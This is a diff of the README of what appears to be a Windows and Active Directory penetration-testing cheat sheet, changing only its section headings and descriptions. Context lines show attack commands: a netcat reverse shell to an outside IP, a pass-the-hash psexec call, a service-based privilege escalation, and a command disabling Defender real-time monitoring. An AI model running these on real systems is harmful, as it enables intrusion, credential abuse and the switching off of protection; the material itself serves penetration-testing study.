@@ -6,22 +6,22 @@ Any **useful commands** for **Windows** / **Active Directory** will be posted he
 
 &nbsp;
 
-* [Reverse shells :hook:](#reverse-shells)
-* [Transfer files](#transfer-files)
-* [Privilege escalation](#privilege-escalation)
-* [Kerberos](#Kerberos)
-* [Pass the hash](#pass-the-hash)
-* [Enumeration](#enumeration)
-* [Security and policies](#security-and-policies)
-* [Misc commands](#misc-commands)
+* [Shells :hook:](#shells)
+* [Transfer files :open_file_folder:](#transfer-files)
+* [Privilege escalation :test_tube:](#privilege-escalation)
+* [Kerberos :label:](#Kerberos)
+* [Pass the hash :joystick:](#pass-the-hash)
+* [Enumeration :mag:](#enumeration)
+* [Security and policies :unlock:](#security-and-policies)
+* [Misc commands :zap:](#misc-commands)
 
 &nbsp;
 
-## Reverse shells
+## Shells
 
 &nbsp;
 
-:hook:
+:hook: Creating your reverse/bind shells
 
 &nbsp;
 
@@ -56,9 +56,12 @@ nc.exe 192.168.13.37 443 -e cmd.exe
 &nbsp;
 &nbsp;
 
-## Transfer files :open_file_folder:
+## Transfer files
 
 &nbsp;
+
+:open_file_folder: Transfering and sharing files over the network
+
 &nbsp;
 
 
@@ -106,9 +109,12 @@ Copy-Item –Path \\PA-USER1337\scripts\nc64.exe –Destination 'C:\Users\jumpsr
 &nbsp;
 &nbsp;
 
-## Privilege escalation :test_tube:
+## Privilege escalation
 
 &nbsp;
+
+:test_tube: Escalating your privilege to the highest privileges 
+
 &nbsp;
 
 
@@ -172,9 +178,12 @@ C:\Users\victim\Desktop>sc start SNMPTRAP
 &nbsp;
 &nbsp;
 
-## Kerberos :label:
+## Kerberos
 
 &nbsp;
+
+:label: Kerberos attacks like extract tickets and crack them or pass them
+
 &nbsp;
 
 
@@ -227,9 +236,12 @@ Invoke-Command -ComputerName UFC-JUMPSRV -Credential $cred -ScriptBlock {
 &nbsp;
 &nbsp;
 
-## Pass the hash :joystick:
+## Pass the hash
 
 &nbsp;
+
+:joystick: Passing the hash for different services
+
 &nbsp;
 
 
@@ -258,9 +270,12 @@ python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes aad3b435b5140
 &nbsp;
 &nbsp;
 
-## Enumeration :mag: 
+## Enumeration
 
 &nbsp;
+
+:mag: Some commands about enumeration snd recon 
+
 &nbsp;
 
 
@@ -296,9 +311,12 @@ Invoke-ACLScanner -ResolveGUID | ? {$_.IdentityReferenceName -like "*jumpsrv*"}
 &nbsp;
 &nbsp;
 
-## Security and policies :unlock:
+## Security and policies
 
 &nbsp;
+
+:unlock: Bypass security, policies and AV evasion
+
 &nbsp;
 
 
@@ -331,9 +349,12 @@ powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true
 &nbsp;
 &nbsp;
 
-## Misc commands :zap:
+## Misc commands
 
 &nbsp;
+
+:zap: Any misc or general command will be here
+
 &nbsp;
 
 
